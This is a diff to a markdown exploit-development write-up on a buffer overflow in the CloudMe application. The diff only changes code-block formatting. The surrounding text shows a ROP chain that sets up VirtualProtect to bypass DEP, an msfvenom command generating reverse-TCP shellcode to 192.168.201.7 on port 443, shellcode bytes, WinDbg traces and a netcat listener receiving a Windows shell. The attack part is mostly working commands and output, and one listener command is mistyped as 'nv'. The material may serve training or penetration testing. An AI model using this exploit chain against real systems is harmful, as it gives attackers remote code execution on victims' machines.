@@ -1709,7 +1709,7 @@ python ROPgadget.py --binary "C:\Users\pentest\AppData\Local\Programs\CloudMe\Cl
 
 The following snippet shows the setup of **VirtualProtect** using ROP gadgets
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 # ROP - NOP
 0x6d9c23ab # POP EDI # RETN [Qt5Sql.dll]
 0x6d9c1011 # RETN [Qt5Sql.dll]
@@ -1743,7 +1743,7 @@ The following snippet shows the setup of **VirtualProtect** using ROP gadgets
 
 #lpAddress
 0x64b4d6cd # JMP ESP [libwinpthread-1.dll]
-```
+</pre>
 
 
 <p align="justify">
@@ -1760,7 +1760,7 @@ The following reverse TCP shellcode will be used in order to exploit the buffer 
 
 From **msfvenom** we generate the reverse TCP shellcode :
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.201.7 LPORT=443 EXITFUNC=thread  -b "\x00" -f  python
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
@@ -1798,7 +1798,7 @@ buf += b"\xdb\x65\x10\xc2\x9d\x69\x7d\xb4\x41\xdb\x28\x81\x7e"
 buf += b"\xd4\xbc\x05\x07\x08\x5d\xe9\xd2\x88\x7d\x08\xf6\xe4"
 buf += b"\x15\x95\x93\x44\x78\x26\x4e\x8a\x85\xa5\x7a\x73\x72"
 buf += b"\xb5\x0f\x76\x3e\x71\xfc\x0a\x2f\x14\x02\xb8\x50\x3d"
-```
+</pre>
 
 <p align="justify">
 Now lets finalize our Proof of Concept exploit script and see the registers pushed into the stack using <b>WinDbg</b> debugger. The final exploit will be as follows :
@@ -1937,7 +1937,7 @@ except Exception as e:
 Now, after running the exploit, we can see step by step in the debugger the values of the registers
 </p>
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 0:000> bp 0x68ef1b07
 *** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Core.dll - 
 0:000> bl
@@ -1983,14 +1983,14 @@ Qt5Core!ZN8qfloat1613mantissatableE+0x61e7:
 0022d708 90909090
 0022d70c 90909090
 0022d710 90909090
-```
+</pre>
 
 <p align="justify">
 As we see, after the <b>PUSHAD</b> instruction is executed, all of the registers are pushed on the stack in specific order that is necessary to successfully execute the <b>VirtualProtect</b>. If we continue the execution, we enter the <b>kernel32!VirtualProtect</b> function and disable DEP for the memory region just below the <b>PUSHAD</b> ROP chain:
 </p>
 
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 eax=90909090 ebx=00000201 ecx=68ee6b16 edx=00000040 esi=762a20d8 edi=6d9c1011
 eip=762a20d8 esp=0022d6ec ebp=6d9c12c9 iopl=0 nv up ei pl nz ac po cy
 cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000213
@@ -2009,14 +2009,14 @@ cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000213
 KERNELBASE!VirtualProtect+0x2:
 75a522bf 55 push ebp
 [..snip..]
-```
+</pre>
 
 <p align="justify">
 If we still continue the execution we can see below that now is possible to execute commands on the stack:
 </p>
 
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 [..snip..]
 eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
 eip=64b4d6cd esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
@@ -2109,7 +2109,7 @@ eip=0022d718 esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
 cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
 0022d718 dbdc fcmovnu st,st(4)
 [..snip..]
-```
+</pre>
 
 
 <p align="justify">
@@ -2125,13 +2125,13 @@ Before running the exploit script above we have first run our listener on port 4
 </p>
 
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 nv -nlvp 443
-```
+</pre>
 
 After running the script we will have our shell&nbsp;
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 root@kali:~# nc -nlvp 443
 listening on [any] 443 ...
 connect to [192.168.201.7] from (UNKNOWN) [192.168.201.88] 49900
@@ -2139,6 +2139,7 @@ Microsoft Windows [Version 6.1.7601]
 Copyright (c) 2009 Microsoft Corporation. All rights reserved.
 
 C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe>
-```
+</pre>
+
 
 
